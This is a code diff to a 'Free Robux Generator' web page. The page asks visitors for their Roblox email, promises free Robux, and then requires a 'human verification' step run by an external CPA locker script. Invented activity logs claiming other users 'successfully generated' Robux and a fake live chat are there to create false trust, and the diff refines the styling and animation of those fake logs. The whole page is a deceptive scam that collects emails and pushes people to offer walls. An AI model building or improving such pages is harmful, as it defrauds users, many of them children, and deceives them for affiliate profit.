@@ -4,71 +4,294 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>Free Robux Generator</title>
-  <link rel="stylesheet" href="style.css" />
+  
 
   <!-- CPA Locker Script -->
   <script type="text/javascript" src="https://squaredownloads.com/script_include.php?id=543917"></script>
 
   <style>
-    #fakeLog {
-      position: fixed;
-      bottom: 10px;
-      left: 10px;
-      background: #222;
-      color: white;
-      padding: 10px 15px;
-      border-radius: 5px;
-      font-family: monospace;
-      font-size: 14px;
-      opacity: 0;
-      transition: opacity 0.5s ease;
-      max-width: 320px;
-      z-index: 9999;
-    }
-    #fakeLog.visible {
-      opacity: 1;
-    }
+body {
+  font-family: 'Segoe UI', sans-serif;
+  background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+  color: #fff;
+  text-align: center;
+  padding: 50px;
+}
+
+.container {
+  background-color: #1c1c1c;
+  padding: 40px;
+  border-radius: 10px;
+  box-shadow: 0 0 20px #00ffff88;
+  max-width: 400px;
+  margin: auto;
+}
+
+input {
+  padding: 10px;
+  width: 80%;
+  margin: 15px 0;
+  border: none;
+  border-radius: 5px;
+}
+
+button {
+  background-color: #00ffcc;
+  color: #000;
+  padding: 12px 24px;
+  border: none;
+  font-weight: bold;
+  border-radius: 5px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #00e6b8;
+}
+
+.note {
+  margin-top: 15px;
+  font-size: 0.9em;
+  color: #ccc;
+}
+
+/* Main log styles */
+#log {
+  background-color: #000;   /* pure black */
+  color: #00ffff;           /* cyan text */
+  font-family: monospace;
+  font-size: 0.9em;
+  padding: 10px;
+  margin-top: 15px;
+  display: none;
+  text-align: left;
+  max-height: 200px;
+  overflow-y: auto;
+  border-radius: 6px;
+  white-space: pre-line;
+  border: 2px solid #222; /* dark border */
+  box-shadow: 0 0 15px #22222288; /* subtle dark shadow */
+}
+
+/* Fake logs box - now positioned below container */
+#fakeLog {
+  width: 100%;
+  max-width: 400px;
+  min-height: 24px;
+  background: #000;           /* pure black background */
+  border: 2px solid #222; /* dark border */
+  box-shadow: 0 0 15px #22222288; /* subtle dark shadow */
+  color: #00ffff;
+  font-family: 'Segoe UI', Tahoma, monospace;
+  font-size: 0.85rem;
+  line-height: 1.3;
+  padding: 8px 15px;
+  border-radius: 8px;
+  user-select: none;
+  overflow: hidden;
+  white-space: nowrap;
+  text-overflow: ellipsis;
+  opacity: 1;
+  margin: 20px auto;
+  box-sizing: border-box;
+  transition: opacity 0.3s ease-in-out;
+}
+
+#fakeLog .timestamp {
+  color: #66ffff;
+  margin-right: 6px;
+  font-weight: bold;
+}
+
+#verify-section {
+  display: none;
+  margin-top: 20px;
+}
+
+select, input, button {
+  margin-top: 10px;
+  padding: 10px;
+  font-size: 1rem;
+  border-radius: 6px;
+}
+
+.verify-box {
+  margin-top: 20px;
+  display: none;
+}
+
+.verify-button {
+  padding: 10px 20px;
+  font-size: 1rem;
+  background-color: #f90;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+}
+
+.spinner {
+  display: inline-block;
+  font-weight: bold;
+  animation: spin 1s steps(8) infinite;
+}
+
+.spinner::after {
+  content: "⠋";
+  animation: spinContent 1s steps(8) infinite;
+}
+
+@keyframes spinContent {
+  0% { content: "⠋"; }
+  12.5% { content: "⠙"; }
+  25% { content: "⠹"; }
+  37.5% { content: "⠸"; }
+  50% { content: "⠼"; }
+  62.5% { content: "⠴"; }
+  75% { content: "⠦"; }
+  87.5% { content: "⠧"; }
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Chatbox styles - now positioned below fake log */
+#chatbox {
+  width: 100%;
+  max-width: 400px;
+  max-height: 400px;
+  background: linear-gradient(135deg, #000, #111); /* pure black to very dark */
+  border: 2px solid #222; /* dark border */
+  border-radius: 10px;
+  display: flex;
+  flex-direction: column;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  color: #eee; /* light text */
+  box-shadow: 0 0 15px #22222288; /* subtle dark shadow */
+  user-select: none;
+  margin: 20px auto;
+}
+
+#chatHeader {
+  padding: 10px;
+  font-weight: bold;
+  background: #111; /* very dark background */
+  border-bottom: 1px solid #222;
+  text-align: center;
+  border-top-left-radius: 10px;
+  border-top-right-radius: 10px;
+  color: #eee;
+}
+
+#chatMessages {
+  flex-grow: 1;
+  overflow-y: auto;
+  padding: 10px;
+  font-size: 0.85rem;
+  line-height: 1.2;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  scrollbar-width: thin;
+  scrollbar-color: #555 transparent;
+  background: #000; /* black background */
+  color: #ddd; /* slightly lighter text */
+  min-height: 200px;
+}
+
+#chatMessages::-webkit-scrollbar {
+  width: 8px;
+}
+
+#chatMessages::-webkit-scrollbar-thumb {
+  background: #555;
+  border-radius: 4px;
+}
+
+#chatInputArea {
+  display: flex;
+  padding: 8px 10px;
+  border-top: 1px solid #222;
+  background: #111;
+  border-bottom-left-radius: 10px;
+  border-bottom-right-radius: 10px;
+}
+
+#chatInput {
+  flex-grow: 1;
+  padding: 8px;
+  border: none;
+  border-radius: 6px;
+  font-size: 1rem;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #111;
+  color: #eee;
+  outline: none;
+}
+
+#chatSendBtn {
+  margin-left: 8px;
+  padding: 8px 15px;
+  background: #222;
+  color: #eee;
+  font-weight: bold;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  user-select: none;
+  transition: background-color 0.3s ease;
+}
+
+#chatSendBtn:hover {
+  background-color: #444;
+  color: #fff;
+}
+
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Free Robux Generator <span id="year"></span></h1>
-    <p>Enter your Roblox E-Mail and choose how many <strong>Robux</strong> you want to receive.</p>
-    
-    <input type="text" placeholder="Enter your Roblox E-Mail" id="username"/>
-    
-    <select id="robuxAmount">
-      <option value="400">400 Robux</option>
-      <option value="800">800 Robux</option>
-      <option value="1600">1,600 Robux</option>
-      <option value="10000" selected>10,000 Robux</option>
-    </select>
-    
-    <button onclick="startGenerating()">Generate Robux</button>
-    
-    <div id="log"></div>
-    
-    <div id="verify-section">
-      <p class="note">✅ Almost done! Complete human verification to unlock your Robux.</p>
-      <div id="locker-script"></div>
+  <div class="main-wrapper">
+    <div class="container">
+      <h1>Free Robux Generator <span id="year"></span></h1>
+      <p>Enter your Roblox E-Mail and choose how many <strong>Robux</strong> you want to receive.</p>
+      
+      <input type="text" placeholder="Enter your Roblox E-Mail" id="username"/>
+      
+      <select id="robuxAmount">
+        <option value="400">400 Robux</option>
+        <option value="800">800 Robux</option>
+        <option value="1600">1,600 Robux</option>
+        <option value="10000" selected>10,000 Robux</option>
+      </select>
+      
+      <button onclick="startGenerating()">Generate Robux</button>
+      
+      <div id="log"></div>
+      
+      <div id="verify-section">
+        <p class="note">✅ Almost done! Complete human verification to unlock your Robux.</p>
+        <div id="locker-script"></div>
+      </div>
+      
+      <div class="verify-box" id="verifyBox" style="display: none;">
+        <p>⚠️ Human Verification Required</p>
+        <button class="verify-button" onclick="showLocker()">Verify Now</button>
+      </div>
     </div>
-    
-    <div class="verify-box" id="verifyBox" style="display: none;">
-      <p>⚠️ Human Verification Required</p>
-      <button class="verify-button" onclick="showLocker()">Verify Now</button>
+
+    <!-- Fake Log positioned below container -->
+    <div id="fakeLogWrapper">
+      <div id="fakeLog"></div>
     </div>
-  </div>
 
-  <!-- Fake logs fixed at bottom left -->
-  <div id="fakeLog"></div>
-
-  <!-- Chatbox fixed bottom right -->
-  <div id="chatbox" aria-live="polite" aria-label="Live chat">
-    <div id="chatHeader">Live Chat</div>
-    <div id="chatMessages" role="log" aria-live="polite" aria-relevant="additions"></div>
-    <div id="chatInputArea">
-      <input id="chatInput" type="text" placeholder="Type your message..." aria-label="Chat input" autocomplete="off" />
-      <button id="chatSendBtn" aria-label="Send chat message">Send</button>
+    <!-- Chatbox positioned below fake log -->
+    <div id="chatbox" aria-live="polite" aria-label="Live chat">
+      <div id="chatHeader">Live Chat</div>
+      <div id="chatMessages" role="log" aria-live="polite" aria-relevant="additions"></div>
+      <div id="chatInputArea">
+        <input id="chatInput" type="text" placeholder="Type your message..." aria-label="Chat input" autocomplete="off" />
+        <button id="chatSendBtn" aria-label="Send chat message">Send</button>
+      </div>
     </div>
   </div>
 
@@ -123,56 +346,57 @@
       }, 150);
     }
 
-    // Updated showNextFakeLog with 3 types of messages cycling through 30 usernames each
- function showNextFakeLog() {
-  const totalUsers = fakeUsernames.length;
+    // Updated showNextFakeLog with animation and no dots
+    function showNextFakeLog() {
+      const totalUsers = fakeUsernames.length;
 
-  // Pick a random user
-  const userIndex = Math.floor(Math.random() * totalUsers);
-  const user = fakeUsernames[userIndex];
-  const timestamp = getTimestamp();
+      // Pick a random user
+      const userIndex = Math.floor(Math.random() * totalUsers);
+      const user = fakeUsernames[userIndex];
+      const timestamp = getTimestamp();
 
-  // Randomly pick phase: 0=failed, 1=bot detected, 2=success
-  const phase = Math.floor(Math.random() * 3);
+      // Randomly pick phase: 0=failed, 1=bot detected, 2=success
+      const phase = Math.floor(Math.random() * 3);
 
-  let message = "";
-  let color = "";
+      let message = "";
+      let color = "";
 
-  switch (phase) {
-    case 0:
-      message = `[${timestamp}] ${user} failed human verification ❌`;
-      color = "red";
-      break;
-    case 1:
-      message = `[${timestamp}] ${user} bot detected ⚠️`;
-      color = "orange";
-      break;
-    case 2:
-      const amount = amounts[Math.floor(Math.random() * amounts.length)];
-      message = `[${timestamp}] ${user} successfully generated ${amount} Robux ✅`;
-      color = "green";
-      break;
-  }
+      switch (phase) {
+        case 0:
+          message = `[${timestamp}] ${user} failed human verification ❌`;
+          color = "red";
+          break;
+        case 1:
+          message = `[${timestamp}] ${user} bot detected ⚠️`;
+          color = "orange";
+          break;
+        case 2:
+          const amount = amounts[Math.floor(Math.random() * amounts.length)];
+          message = `[${timestamp}] ${user} successfully generated ${amount} Robux ✅`;
+          color = "green";
+          break;
+      }
 
-  fakeLogBox.innerHTML = `<span style="color:${color}; font-weight: bold;">${message}</span>`;
-  fakeLogBox.classList.add('visible');
+      // Fade out
+      fakeLogBox.style.opacity = "0";
+      
+      setTimeout(() => {
+        fakeLogBox.innerHTML = `<span style="color:${color}; font-weight: bold;">${message}</span>`;
+        // Fade in
+        fakeLogBox.style.opacity = "1";
+        playBeep();
+      }, 300);
 
-  playBeep();  // <---- Call beep for every log here
+      // Show for 3 seconds then hide for 1 second before next, randomize delay a bit
+      const showDuration = 3000 + Math.random() * 2000; // 3-5 sec visible
+      const hideDuration = 1000 + Math.random() * 2000; // 1-3 sec hidden
 
-  // Show for 3 seconds then hide for 1 second before next, randomize delay a bit
-  const showDuration = 3000 + Math.random() * 2000; // 3-5 sec visible
-  const hideDuration = 1000 + Math.random() * 2000; // 1-3 sec hidden
-
-  setTimeout(() => {
-    fakeLogBox.classList.remove('visible');
-    setTimeout(() => {
-      showNextFakeLog();
-    }, hideDuration);
-  }, showDuration);
-}
-
-
-
+      setTimeout(() => {
+        setTimeout(() => {
+          showNextFakeLog();
+        }, hideDuration);
+      }, showDuration);
+    }
 
     // Start the cycle on page load
     window.addEventListener("load", () => {
@@ -228,11 +452,10 @@
       let i = 0;
       function showNextStep() {
         if (i < steps.length) {
-          const loadingText = `> ${steps[i]}...`;
+          const loadingText = `> ${steps[i]}`;
           const stepLine = document.createElement("div");
           const spinner = document.createElement("span");
           spinner.className = "spinner";
-          spinner.textContent = "⠋";
 
           stepLine.textContent = loadingText + " ";
           stepLine.appendChild(spinner);
